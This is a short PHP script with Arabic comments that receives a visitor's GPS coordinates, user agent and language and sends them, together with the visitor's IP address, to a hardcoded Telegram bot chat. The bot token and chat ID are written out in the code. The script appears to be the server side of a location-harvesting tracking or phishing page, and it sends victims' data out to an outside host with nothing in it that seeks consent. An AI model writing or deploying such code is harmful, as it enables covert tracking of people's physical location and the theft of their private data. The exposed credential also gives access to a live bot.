<?php
// بيانات Telegram
$botToken = "7086345089:AAE-dXYWlzjrOz_3IgdVnHLLMQbO4RdwFIA";
$chatId = "6017837134";

// استقبال بيانات الموقع الجغرافي وبيانات الجهاز
$data = json_decode(file_get_contents("php://input"), true);
$latitude = $data['latitude'];
$longitude = $data['longitude'];
$userAgent = $data['userAgent'];
$language = $data['language'];

// تسجيل IP الجهاز
$userIP = $_SERVER['REMOTE_ADDR'];

// إنشاء الرسالة التي سترسل إلى Telegram
$message = "🌍 User Location Info:\nLatitude: $latitude\nLongitude: $longitude\nIP: $userIP\nUser Agent: $userAgent\nLanguage: $language";
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
?>
